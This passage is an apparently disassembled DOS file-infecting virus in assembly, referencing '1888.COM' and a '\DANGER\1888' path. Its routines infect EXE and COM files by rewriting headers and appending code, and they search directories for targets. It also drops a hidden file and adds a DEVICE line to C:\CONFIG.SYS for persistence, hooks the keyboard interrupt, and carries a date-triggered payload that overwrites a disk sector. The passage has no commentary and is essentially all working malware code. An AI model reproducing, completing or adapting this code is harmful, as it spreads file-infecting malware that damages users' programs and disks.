;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0B08	proc	near
		lea	dx,data_010C		; ('1888.COM') Load effective addr
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		jc	loc_ret_0B1C		; Jump if carry Set
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax

loc_ret_0B1C:
		retn
sub_0B08	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0B1D	proc	near
		push	ds
		mov	ax,word ptr data_012C+2
		mov	ds,ax
		mov	cx,100h
		xor	dx,dx			; Zero register
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		cmp	word ptr ds:d_9E01_0000_e,5A4Dh
		nop				;*ASM fixup - sign extn byte
		je	loc_0B38		; Jump if equal
		stc				; Set carry flag
		jmp	loc_0BB7
loc_0B38:
		call	sub_0BB9
		push	ax
		mov	ax,di
		and	ax,0Fh
		mov	cx,10h
		xor	dx,dx			; Zero register
		sub	cx,ax
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jnc	loc_0B51		; Jump if carry=0
		jmp	short loc_0BB7
		db	90h
loc_0B51:
		mov	si,ax
		mov	cx,100h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jc	loc_0BB7		; Jump if carry Set
		pop	dx
		mov	ax,di
		add	ax,si
		add	ax,100h
		cmp	ax,200h
		jb	loc_0B6D		; Jump if below
		and	ax,1FFh
		inc	dx
loc_0B6D:
		mov	cl,4
		shr	ax,cl			; Shift w/zeros fill
		dec	dx
		mov	cl,5
		shl	dx,cl			; Shift w/zeros fill
		sub	dx,ds:d_9E01_0008_e
		add	ax,dx
		sub	ax,10h
		mov	ds:d_9E01_0016_e,ax
		mov	word ptr ds:d_9E01_0014_e,100h
		push	ds
		mov	ax,cs
		mov	ds,ax
		mov	cx,data_011C
		mov	dx,100h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		pop	ds
		jc	loc_0BB7		; Jump if carry Set
		call	sub_0BB9
		mov	ds:d_9E01_0002_e,di
		mov	ds:d_9E01_0004_e,ax
		mov	ax,4200h
		xor	dx,dx			; Zero register
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_0BB7		; Jump if carry Set
		mov	cx,100h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_0BB7:
		pop	ds
		retn
sub_0B1D	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0BB9	proc	near
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	di,ax
		and	di,1FFh
		mov	cl,9
		shr	ax,cl			; Shift w/zeros fill
		mov	cl,7
		shl	dx,cl			; Shift w/zeros fill
		add	ax,dx
		inc	ax
		retn
sub_0BB9	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0BD4	proc	near
		mov	ax,data_0108
		mov	data_0120,ax
		mov	cx,data_011C
		cmp	cx,ax
		jb	loc_0BEA		; Jump if below
		mov	data_0120,cx
		mov	cx,data_0108
loc_0BEA:
		push	ds
		mov	ax,word ptr data_012C+2
		mov	ds,ax
		xor	dx,dx			; Zero register
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		pop	ds
		jc	loc_ret_0C3F		; Jump if carry Set
		mov	ax,4200h
		xor	dx,dx			; Zero register
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_ret_0C3F		; Jump if carry Set
		mov	dx,100h
		mov	cx,data_011C
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jc	loc_ret_0C3F		; Jump if carry Set
		cmp	ax,data_0108
		ja	loc_0C2E		; Jump if above
		mov	ax,4200h
		mov	dx,data_0108
		mov	data_0120,dx
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_ret_0C3F		; Jump if carry Set
		mov	cx,data_011C
		jmp	short loc_0C32
loc_0C2E:
		mov	cx,data_0108
loc_0C32:
		push	ds
		mov	ax,word ptr data_012C+2
		mov	ds,ax
		xor	dx,dx			; Zero register
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		pop	ds

loc_ret_0C3F:
		retn
sub_0BD4	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0C40	proc	near
		cmp	data_011B,2
		ja	loc_0C4A		; Jump if above
		xor	ax,ax			; Zero register
		retn
loc_0C4A:
		mov	al,data_0133
		and	al,1
		retn
sub_0C40	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0C50	proc	near
		cmp	data_0133,0Fh
		jb	loc_0C69		; Jump if below
		mov	al,data_0135
		cmp	al,13h
		jb	loc_0C69		; Jump if below
		mov	ax,40h
		mov	es,ax
		mov	byte ptr es:d_0040_004A_e,23h	; '#'
loc_0C69:
		cmp	data_0133,0Dh
		jne	loc_ret_0C86		; Jump if not equal
		cmp	data_0134,5
		jne	loc_ret_0C86		; Jump if not equal
		mov	ax,301h
		mov	cx,1
		mov	dx,50h
		xor	bx,bx			; Zero register
		mov	es,bx
		int	13h			; Disk  dl=drive ?  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head

loc_ret_0C86:
		retn
sub_0C50	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0C87	proc	near
		mov	data_019B,1
		lea	dx,data_05C1		; Load effective addr
		mov	cx,27h
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jnc	loc_0CC6		; Jump if carry=0
		mov	ah,3Ch			; '<'
		mov	cx,6
		int	21h			; DOS Services  ah=function 3Ch
						;  create/truncate file @ ds:dx
		mov	bx,ax
		lea	dx,data_05EE		; Load effective addr
		mov	cx,data_070A
		mov	si,dx
		add	si,data_00B3_e
		mov	ax,data_0130
		mov	[si],ax
		mov	ah,data_0132
		mov	[si+2],ah
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jc	loc_0D1F		; Jump if carry Set
loc_0CC6:
		lea	dx,data_05C7		; ('C:\CONFIG.SYS') Load effective add
		mov	cx,27h
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_0D1F		; Jump if carry Set
		call	sub_0ACE
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax
		jc	loc_0D1F		; Jump if carry Set
		mov	cx,data_0108
		push	es
		push	ds
		mov	ax,word ptr data_012C+2
		mov	ds,ax
		mov	es,ax
		xor	dx,dx			; Zero register
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		pop	ds
		mov	dx,ax
		mov	ax,0FFFFh
		xor	di,di			; Zero register
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		cmp	ax,es:[di-1]
		pop	es
		jz	loc_0D1F		; Jump if zero
		mov	ax,4200h
		xor	cx,cx			; Zero register
		dec	dx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_0D1F		; Jump if carry Set
		lea	dx,data_05D5		; ('DEVICE =') Load effective addr
		mov	cx,19h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_0D1F:
		call	sub_0ADF
		retn
sub_0C87	endp

		inc	bx
		cmp	bl,[si-1]
		inc	word ptr [bx+si]
		inc	bx
		cmp	bl,[si+43h]
		dec	di
		dec	si
		inc	si
		dec	cx
		inc	di
		db	 2Eh, 53h, 59h, 53h, 00h
		db	'DEVICE ='
		db	0FFh,0FFh
		db	' COUNTRY.SYS', 0Dh, 0Ah
		db	 1Ah,0FFh,0FFh,0FFh,0FFh, 40h
		db	0C8h, 16h, 00h, 21h, 00h
		db	'hgt42   '
		db	 00h, 00h, 00h, 00h, 2Eh, 89h
		db	 1Eh, 12h, 00h, 2Eh, 8Ch, 06h
		db	 14h, 00h,0CBh, 1Eh, 06h, 0Eh
		db	 1Fh,0C4h, 3Eh, 12h, 00h, 26h
		db	 8Ah, 45h, 02h, 3Ch, 00h, 75h
		db	 03h,0E8h, 82h, 00h
		db	 0Dh, 00h, 10h, 26h, 89h, 45h
		db	 03h, 07h, 1Fh,0CBh, 50h, 53h
		db	 51h, 1Eh
		db	0E4h, 60h,0A8h, 80h, 75h, 30h
		db	 2Eh, 8Bh, 1Eh,0A9h, 00h, 3Ah
		db	0C7h, 75h, 27h,0B8h, 40h, 00h
		db	 8Eh,0D8h,0E8h, 28h, 00h, 25h
		db	 05h, 00h, 8Bh,0C8h
		db	0BBh, 1Ch, 00h

locloop_0DB1:
		mov	ax,cs:data_00A9_e
		mov	[bx],ax
		add	bx,2
		cmp	bx,3Fh
		jb	loc_0DC2		; Jump if below
		mov	bx,1Eh
loc_0DC2:
		mov	word ptr ds:[1Ch],bx
		loop	locloop_0DB1		; Loop if cx > 0

loc_0DC8:
		pop	ds
		pop	cx
		pop	bx
		pop	ax
		jmp	dword ptr cs:data_00A3_e

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0DD1	proc	near
		mov	ax,cs:data_00A7_e
		push	ax
		and	ah,0B4h
		pop	ax
		jp	loc_0DDD		; Jump if parity=1
		stc				; Set carry flag
loc_0DDD:
		rcl	ax,1			; Rotate thru carry
		mov	cs:data_00A7_e,ax
		retn
sub_0DD1	endp

		db	'hgt42   '
		db	 00h, 56h, 31h, 00h, 46h, 52h
		db	 44h, 00h, 00h, 00h, 00h, 00h
		db	 00h, 65h, 12h, 65h, 73h, 74h
		db	 6Eh, 12h, 1Fh, 14h, 31h,0CDh
		db	0ABh,0EFh
		db	 06h, 57h,0B4h, 2Ah,0CDh, 21h
		db	 8Ah,0E6h, 3Bh, 0Eh,0B3h, 00h
		db	 74h, 03h, 80h,0C4h
		db	0Ch
loc_0E17:
		sub	ah,ds:data_00B5_e
		cmp	ah,3
		jb	loc_0E5D		; Jump if below
		mov	ds:data_00B5_e,dh
		mov	ds:data_00B3_e,cx
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	ds:data_00A7_e,dx
		call	sub_0DD1
		mov	bx,ax
		and	bx,3
		nop				;*ASM fixup - sign extn byte
		mov	al,ds:data_00AB_e[bx]
		mov	ah,ds:data_00AF_e[bx]
		mov	ds:data_00A9_e,ax
		mov	ax,3516h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_00A3_e,bx
		mov	bx,es
		mov	word ptr ds:data_00A3_e+2,bx
		cli				; Disable interrupts
;*		mov	dx,offset loc_003E	;*
		db	0BAh, 3Eh, 00h
		mov	ax,2516h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		sti				; Enable interrupts
loc_0E5D:
		pop	di
		pop	es
		mov	word ptr es:[di+0Eh],0B6h
		mov	es:[di+10h],cs
		xor	ax,ax			; Zero register
		retn
		db	1Ch
		db	 01h, 8Bh, 1Eh, 28h, 01h,0A1h
		db	 26h, 01h, 8Eh,0D0h, 8Bh, 26h
		db	 24h, 01h, 83h,0ECh, 04h, 8Bh
		db	0F4h, 80h, 3Eh, 1Fh, 01h, 00h
		db	 75h, 28h,0BFh, 00h, 01h, 36h
		db	 89h, 3Ch, 8Bh,0FBh, 36h, 89h
		db	 7Ch, 02h, 33h,0FFh, 36h, 89h
		db	 7Ch, 04h
		db	0BFh, 00h, 01h, 8Bh, 36h, 22h
		db	 01h, 03h,0F7h, 8Bh, 0Eh, 1Ch
		db	 01h, 8Ch,0D8h, 8Eh,0C0h,0F3h
		db	0A4h,0EBh, 16h, 90h
loc_0EAF:
		mov	di,bx
		add	di,10h
		mov	ax,ds:data_0016_e
		add	di,ax
		mov	ss:[si+2],di
		mov	di,word ptr ds:data_0012_e+2
		mov	ss:[si],di
loc_0EC4:
		mov	ds,bx
		mov	es,bx
		retf				; Return far
		db	 8Ch,0D0h, 2Eh,0A3h, 26h, 01h
		db	 2Eh, 89h, 26h, 24h, 01h, 8Ch
		db	0C8h, 8Eh,0D0h,0BCh,0F7h, 01h
		db	 1Eh, 8Eh,0D8h, 58h,0A3h, 28h
		db	 01h,0E8h,0E6h,0FAh, 8Ch,0C8h
		db	 8Eh,0C0h,0E8h, 6Dh,0FAh
		db	0BAh, 9Dh, 01h,0B4h, 1Ah,0CDh
		db	 21h,0E8h, 1Bh,0FBh,0E8h, 0Eh
		db	0FBh, 73h, 03h,0E9h, 9Eh, 00h
loc_0EFE:
		call	sub_0989
		jc	loc_0F06		; Jump if carry Set
		jmp	loc_0F9C
loc_0F06:
		call	sub_099C
		call	sub_0A32
		mov	data_011E,0
loc_0F11:
		call	sub_0AB7
		jc	loc_0F62		; Jump if carry Set
loc_0F16:
		cmp	data_019C,4
		ja	loc_0F9C		; Jump if above
		call	sub_0ACE
		call	sub_0AAF
		jnc	loc_0F5C		; Jump if carry=0
		cmp	data_010A,4
		ja	loc_0F5C		; Jump if above
		call	sub_0B08
		jc	loc_0F9C		; Jump if carry Set
		cmp	data_011E,0
		je	loc_0F3D		; Jump if equal
		call	sub_0B1D
		jmp	short loc_0F40
loc_0F3D:
		call	sub_0BD4
loc_0F40:
		call	sub_0ADF
		jc	loc_0F9C		; Jump if carry Set
		inc	data_019C
		cmp	data_019B,1
		je	loc_0F5C		; Jump if equal
		call	sub_0C40
		jz	loc_0F5C		; Jump if zero
		call	sub_0C87
		jc	loc_0F9C		; Jump if carry Set
		jmp	short loc_0F11
loc_0F5C:
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_0F16		; Jump if carry=0
loc_0F62:
		cmp	data_011E,1
		je	loc_0F70		; Jump if equal
		mov	data_011E,1
		jmp	short loc_0F11
loc_0F70:
		mov	data_011E,0
		cmp	data_019A,0
		jne	loc_0F8B		; Jump if not equal
		lea	dx,data_015A		; ('C:\') Load effective addr
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		mov	data_019A,0FFh
		jmp	short loc_0F11
loc_0F8B:
		cmp	data_0182,0
		je	loc_0F9C		; Jump if equal
		call	sub_0A8A
		dec	data_0182
		jmp	loc_0F11
loc_0F9C:
		lea	dx,data_013A		; ('\DANGER\1888') Load effective addr
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		call	sub_0C40
		jz	loc_0FAC		; Jump if zero
		call	sub_0C50
loc_0FAC:
		mov	ax,word ptr data_012C+2
		mov	es,ax
		mov	cx,5Bh
		mov	si,offset data_070C
		xor	di,di			; Zero register
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		call	sub_09EE
		call	data_012C

seg_a		ends



		end	start
